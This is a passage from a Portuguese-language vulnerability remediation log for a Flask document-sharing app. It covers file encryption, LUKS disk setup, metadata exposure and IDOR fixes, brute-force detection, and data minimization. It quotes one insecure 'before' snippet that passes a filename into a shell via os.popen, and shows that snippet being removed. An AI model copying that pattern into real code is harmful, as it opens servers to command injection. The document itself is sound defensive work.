    return get_fernet().decrypt(data)
```

No upload, os bytes do ficheiro são cifrados antes de serem escritos em disco:

```python
# Antes — app.py
uploaded_file.save(destination)

# Depois — V-31: cifrar antes de escrever em disco
from app import crypto

raw_bytes = uploaded_file.read()
encrypted_bytes = crypto.encrypt_file(raw_bytes)
with open(destination, "wb") as f:
    f.write(encrypted_bytes)
```

No download (próprio e partilhado), o ficheiro é decifrado em memória antes de ser enviado ao cliente — transparente para o utilizador:

```python
# Antes — app.py
return flask.send_from_directory(upload_folder, row[2])

# Depois — V-31: decifrar antes de enviar
from app import crypto
import io

filepath = upload_folder / row[2]
with open(filepath, "rb") as f:
    encrypted = f.read()
decrypted = crypto.decrypt_file(encrypted)

return flask.send_file(
    io.BytesIO(decrypted),
    download_name=row[2],
    as_attachment=True,
)
```

A chave Fernet é gerada com:
```bash
python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
```

E adicionada ao `.env`:
```
FILE_ENCRYPTION_KEY=<chave gerada>
```

Adicionada também ao `.env.example` (sem valor) e injetada nos dois `docker-compose` via variável de ambiente no serviço `web`:
```yaml
environment:
  - FILE_ENCRYPTION_KEY=${FILE_ENCRYPTION_KEY}
```

**Verificação:** após upload, o ficheiro em disco é ilegível sem a chave:
```bash
docker compose exec web cat uploads/documento.pdf
# gAAAAABp_zc3ftrMw1G39roXYz7BR0hl3TeJ571... (conteúdo cifrado)
```

---

### 2. Cifra do volume PostgreSQL (host — produção)

O Docker não tem mecanismo nativo para cifrar volumes. Em produção Linux, o volume `pgdata` deve residir num dispositivo cifrado com **LUKS** — o sistema de cifra de disco padrão no Linux. O Docker usa o mount point normalmente; a cifra é transparente ao nível do bloco.

**Configuração inicial (uma vez apenas):**
```bash
sudo cryptsetup luksFormat /dev/sdX       # formatar com LUKS (pede password)
sudo cryptsetup open /dev/sdX pgdata_crypt # abrir o dispositivo cifrado
sudo mkfs.ext4 /dev/mapper/pgdata_crypt   # criar sistema de ficheiros
sudo mount /dev/mapper/pgdata_crypt /var/lib/docker/volumes/pgdata/_data
docker compose up -d
```

**A cada reinício do servidor:**
```bash
sudo cryptsetup open /dev/sdX pgdata_crypt
sudo mount /dev/mapper/pgdata_crypt /var/lib/docker/volumes/pgdata/_data
docker compose up -d
```

Se o servidor reiniciar sem intervenção manual, o volume fica inacessível sem a password LUKS — comportamento intencional que protege contra acesso físico não autorizado.

Esta configuração é documentada no `README.md` na secção de produção e não afeta o ambiente de desenvolvimento local.

---

**Ficheiros alterados/criados:**
- `web/app/crypto.py` (novo)
- `web/app/app.py` — upload e downloads cifrados/decifrados
- `web/requirements.txt` — `cryptography==46.0.7`
- `docker-compose.yml` — `FILE_ENCRYPTION_KEY` no serviço `web`
- `docker-compose.deploy.yml` — idem
- `.env` — `FILE_ENCRYPTION_KEY`
- `.env.example` — `FILE_ENCRYPTION_KEY=`
- `README.md` — instruções de cifra LUKS para produção

---

## V-32 — Sem proteção de metadados de documentos ✅

**Problema:**
Os endpoints de listagem e detalhe de documentos expunham metadados sensíveis sem validação de ownership server-side. Concretamente:

- `GET /documents/<id>` — só verificava se o utilizador era dono, bloqueando erroneamente utilizadores com quem o documento foi partilhado. Além disso, passava `owner_id` (ID interno da BD) e `metadata` (output do `stat` — path absoluto, inode, permissões, etc.) diretamente ao template.
- `GET /documents` — incluía `filename` (path interno) no dict dos documentos partilhados enviado ao template.
- `GET /shared` — mesmo problema: `filename` exposto desnecessariamente na listagem de documentos partilhados.

Um utilizador autenticado podia inspecionar o HTML renderizado e obter caminhos internos do servidor e IDs de outros utilizadores sem qualquer autorização.

**Fix:**

**`app.py` — `document_details`:** a verificação de acesso passou a dois níveis — primeiro verifica se é dono; se não for, consulta `document_shares` para confirmar se o documento foi explicitamente partilhado com o utilizador atual. Se nenhuma das condições se verificar, devolve 403. A lista de partilhas (`shared_with`) só é consultada e enviada ao template se o utilizador for o dono. O dict passado ao template passou a excluir `owner_id` e `metadata`, mantendo `filename` (necessário para o template mostrar o nome do ficheiro) e adicionando o flag `is_owner`.

```python
# Antes — app.py
document = {
    "id": row[0],
    "owner_id": row[1],   # ID interno exposto
    "title": row[2],
    "filename": row[3],
    "metadata": row[4],   # output bruto do stat exposto (path, inode, permissões...)
}
# + sem acesso para utilizadores com partilha
if current_user_id != owner_id:
    flask.abort(403)
```

```python
# Depois — app.py
is_owner = (current_user_id == owner_id)

if not is_owner:
    shared_row = db.get_shared_document_for_user(cur, document_id, current_user_id)
    if not shared_row:
        flask.abort(403)

# Só o dono vê e pode gerir a lista de partilhas
shared_with_rows = db.get_shares_for_document(cur, document_id, owner_id) if is_owner else []

# Não expor owner_id nem metadata ao template
document = {
    "id": row[0],
    "title": row[2],
    "filename": row[3],
    "is_owner": is_owner,
}
```

**`app.py` — `documents_page`:** removido `filename` do dict dos documentos partilhados enviado ao template. Os documentos próprios mantêm `filename` pois o template necessita dele.

```python
# Antes
shared_documents = [{"id": r[0], "title": r[1], "filename": r[2], "uploaded_at": r[3], "owner_username": r[4]} for r in shared_docs]

# Depois
shared_documents = [{"id": r[0], "title": r[1], "uploaded_at": r[3], "owner_username": r[4]} for r in shared_docs]
```

**`app.py` — `shared_documents`:** removido `filename` do dict enviado ao template de `/shared`.

```python
# Antes
documents = [{"id": r[0], "title": r[1], "filename": r[2], "uploaded_at": r[3], "owner_username": r[4]} for r in rows]

# Depois
documents = [{"id": r[0], "title": r[1], "uploaded_at": r[3], "owner_username": r[4]} for r in rows]
```

**Nota:** a exposição de `metadata` bruto (output completo do `stat` com path absoluto do servidor) foi também eliminada pela reescrita da função `extract_metadata` — documentada em V-34. Os downloads continuam a funcionar via `/documents/<id>/download` e `/shared/<id>/download`, que fazem a verificação de ownership server-side de forma independente.

**Ficheiros:** `app.py`

---

# Stage 3 - Correções de Vulnerabilidades

---

## V-33 — Sem deteção de atividade suspeita ✅

**Problema:**
A aplicação tinha audit logs a funcionar (V-16), mas não fazia qualquer análise automática sobre eles. Logins falhados repetidos, acessos negados em série e padrões anómalos de acesso não geravam qualquer alerta ou resposta automática — os logs existiam mas ninguém os lia. Um atacante podia fazer brute force ao login ou varrer documentos de outros utilizadores sem que ninguém fosse alertado.

```python
# Antes — app.py (login falhado)
audit.log_event(cur, audit.LOGIN_FAILURE, user_id=failed_user_id, username=username,
                details="bad_credentials")
conn.commit()
# análise dos logs: nenhuma
```

```python
# Antes — app.py (acesso negado)
if not shared_row:
    flask.abort(403)
# sem registo de access_denied, sem deteção de padrão
```

**Fix:**

**`audit.py`** — adicionada a constante `ACCESS_DENIED`, os thresholds configuráveis e a função `check_suspicious_activity`. Esta função é chamada após cada evento relevante, consulta os audit logs recentes na BD e, se o número de ocorrências ultrapassar o threshold, faz duas coisas:
1. Emite um `WARNING` no logger `"security"` (visível em `docker logs`)
2. Regista um evento `suspicious_activity` nos `audit_logs` para auditoria

```python
# Depois — audit.py

# V-33 — acesso negado (para deteção de anomalias)
ACCESS_DENIED = "access_denied"

_security_logger = logging.getLogger("security")

# Thresholds configuráveis
FAILED_LOGIN_WINDOW_SECONDS  = 300   # janela de 5 minutos
FAILED_LOGIN_THRESHOLD       = 5     # nº de falhas que dispara alerta
ACCESS_DENIED_WINDOW_SECONDS = 120   # janela de 2 minutos
ACCESS_DENIED_THRESHOLD      = 10    # nº de acessos negados que dispara alerta


def check_suspicious_activity(cur, event_type, user_id=None, username=None, ip_address=None):
    alert_details = None

    if event_type == LOGIN_FAILURE:
        cur.execute(
            """
            SELECT COUNT(*) FROM audit_logs
            WHERE event_type = %s
              AND created_at > NOW() - (%s * INTERVAL '1 second')
              AND (ip_address = %s OR username = %s)
            """,
            (LOGIN_FAILURE, FAILED_LOGIN_WINDOW_SECONDS, ip_address, username),
        )
        count = int(cur.fetchone()[0])
        if count >= FAILED_LOGIN_THRESHOLD:
            alert_details = (
                f"Brute-force detetado: {count} falhas de login nos últimos "
                f"{FAILED_LOGIN_WINDOW_SECONDS}s "
                f"para username='{username}' ip='{ip_address}'"
            )

    elif event_type == ACCESS_DENIED:
        cur.execute(
            """
            SELECT COUNT(*) FROM audit_logs
            WHERE event_type = %s
              AND created_at > NOW() - (%s * INTERVAL '1 second')
              AND user_id = %s
            """,
            (ACCESS_DENIED, ACCESS_DENIED_WINDOW_SECONDS, user_id),
        )
        count = int(cur.fetchone()[0])
        if count >= ACCESS_DENIED_THRESHOLD:
            alert_details = (
                f"Acesso negado repetido: {count} vezes nos últimos "
                f"{ACCESS_DENIED_WINDOW_SECONDS}s para user_id={user_id}"
            )

    if alert_details:
        _security_logger.warning("[SUSPICIOUS ACTIVITY] %s", alert_details)
        cur.execute(
            """
            INSERT INTO audit_logs (event_type, user_id, username, ip_address, details, created_at)
            VALUES (%s, %s, %s, %s, %s, %s)
            """,
            (
                "suspicious_activity",
                user_id,
                username,
                ip_address,
                alert_details,
                datetime.datetime.now(datetime.timezone.utc),
            ),
        )
```

**`app.py`** — `check_suspicious_activity` chamada em três pontos:

**1. Login falhado** — deteta brute-force por IP ou username:

```python
# Depois — app.py (login)
audit.log_event(cur, audit.LOGIN_FAILURE, user_id=failed_user_id, username=username,
                details="account_disabled" if (user and user[3]) else "bad_credentials")

# V-33 — detetar brute-force após registo da falha
audit.check_suspicious_activity(
    cur,
    event_type=audit.LOGIN_FAILURE,
    user_id=failed_user_id,
    username=username,
    ip_address=flask.request.remote_addr,
)
```

**2. `document_details`** — deteta enumeração de documentos alheios:

```python
# Depois — app.py (document_details)
if not is_owner:
    shared_row = db.get_shared_document_for_user(cur, document_id, current_user_id)
    if not shared_row:
        # V-33 — registar acesso negado e verificar padrão suspeito
        audit.log_event(cur, audit.ACCESS_DENIED, user_id=current_user_id,
                        username=flask.session.get("username"),
                        details=f"document_id={document_id}")
        audit.check_suspicious_activity(
            cur,
            event_type=audit.ACCESS_DENIED,
            user_id=current_user_id,
        )
        conn.commit()
        cur.close()
        conn.close()
        flask.abort(403)
```

**3. `download_document`** — deteta tentativas de download de documentos alheios:

```python
# Depois — app.py (download_document)
if row[1] != flask.session.get("user_id"):
    # V-33 — registar acesso negado e verificar padrão suspeito
    current_user_id = flask.session.get("user_id")
    audit.log_event(cur, audit.ACCESS_DENIED, user_id=current_user_id,
                    username=flask.session.get("username"),
                    details=f"document_id={document_id} action=download")
    audit.check_suspicious_activity(
        cur,
        event_type=audit.ACCESS_DENIED,
        user_id=current_user_id,
    )
    conn.commit()
    cur.close()
    conn.close()
    flask.abort(403)
```

**`app.py` — `create_app`** — o logger `"security"` é configurado explicitamente para garantir que os WARNINGs aparecem nos logs do container:

```python
# V-33 — configurar logger de segurança
security_logger = logging.getLogger("security")
if not security_logger.handlers:
    handler = logging.StreamHandler()
    handler.setLevel(logging.WARNING)
    security_logger.addHandler(handler)
    security_logger.setLevel(logging.WARNING)
```

**Nota técnica:** o `count` retornado pelo psycopg2 é convertido explicitamente com `int()` para garantir compatibilidade com diferentes versões do driver, onde o tipo do resultado pode variar. A função `check_suspicious_activity` é sempre chamada **após** `log_event` e **antes** do `conn.commit()` — usa o mesmo cursor e transação, evitando commits parciais.

**Padrões detetados:**

| Padrão | Trigger | Threshold |
|---|---|---|
| Brute-force / credential stuffing | `login_failure` por IP ou username | 5 falhas em 5 minutos |
| Enumeração de documentos (IDOR) | `access_denied` por user_id | 10 acessos em 2 minutos |

**Como consultar alertas na BD:**

```sql
SELECT event_type, username, details, created_at
FROM audit_logs
WHERE event_type = 'suspicious_activity'
ORDER BY created_at DESC;
```

**Ficheiros:** `web/app/audit.py`, `web/app/app.py`

---

## V-34 — Sem data minimization ✅

**Problema:**
Três pontos de excesso de dados no sistema:

1. **`extract_metadata` em `app.py`** — chamava `utils.call(utils.build("stat", filename))` que corria `os.popen(cmd)`. O output do comando `stat` inclui o path absoluto do ficheiro no servidor, inode, device ID, permissões Unix, owner/group do sistema de ficheiros e múltiplos timestamps — informação excessiva e desnecessária para a aplicação. O fix de V-02 (eliminar o shell) e V-34 (minimizar metadados) foram aplicados em conjunto.

2. **Eventos de download nos audit logs** — os eventos `DOCUMENT_DOWNLOAD` e `SHARED_DOWNLOAD` registavam `filename` (path interno do servidor) no campo `details`. O `document_id` é suficiente para rastreabilidade; o path interno não deve ser persistido em logs.

3. **Registo de IP sem critério** — o IP do cliente era registado em todos os eventos de auditoria, incluindo visualizações de documentos e ações administrativas onde não tem valor probatório. Apenas eventos de autenticação justificam o armazenamento do IP.

4. **Coluna `username` sem restrição de comprimento** — declarada como `TEXT` sem limite, permitindo armazenar valores arbitrariamente longos.

```python
# Antes — app.py
def extract_metadata(filename):
    cmd = utils.build("stat ", str(filename), " 2>&1")
    return utils.call(cmd)  # os.popen — path, inode, permissões, timestamps — tudo guardado

# audit log do download incluía o path interno:
details=f"document_id={document_id} filename={row[2]}"
```

```python
# Antes — audit.py
# IP registado em todos os eventos, sem distinção
ip_address = flask.request.remote_addr
```

```sql
-- Antes — init.sql
username TEXT UNIQUE NOT NULL  -- sem limite de comprimento
```

**Fix:**

**`app.py` — `extract_metadata` reescrita** para guardar apenas `size_bytes` e `extension`, usando `pathlib.Path.stat()` diretamente sem invocar processos externos. Esta alteração foi feita em conjunto com o fix de V-02 — ao eliminar o vetor de injeção de comandos, aproveitou-se para também minimizar os dados guardados.

```python
# Depois — app.py
def extract_metadata(filepath):
    """Guarda apenas os campos mínimos necessários (data minimization).
    Excluídos: path absoluto, inode, device, permissões, owner/group, timestamps.
    """
    try:
        p = pathlib.Path(filepath)
        size = p.stat().st_size
        ext = p.suffix.lower()
        return f"size_bytes={size} extension={ext}"
    except Exception:
        return ""
```

**`app.py` — eventos de download** passam a registar apenas o `document_id`:

```python
# Depois — app.py
details=f"document_id={document_id}"   # filename removido
```

**`audit.py` — registo de IP seletivo** via conjunto `_EVENTS_REQUIRING_IP`:

```python
# Depois — audit.py
_EVENTS_REQUIRING_IP = frozenset({
    "login_success",
    "login_failure",
    "logout",
})

def log_event(cur, event_type, user_id=None, username=None, details=None):
    ip_address = None
    if event_type in _EVENTS_REQUIRING_IP:
        try:
            ip_address = flask.request.remote_addr
        except RuntimeError:
            pass
    # ...
```

**`init.sql` — restrição de comprimento no `username`** e bloco de comentários com a política de data minimization de cada tabela:

```sql
-- Depois — init.sql
username VARCHAR(64) UNIQUE NOT NULL  -- limitado a 64 caracteres
```

**Ficheiros:** `app.py`, `audit.py`, `init.sql`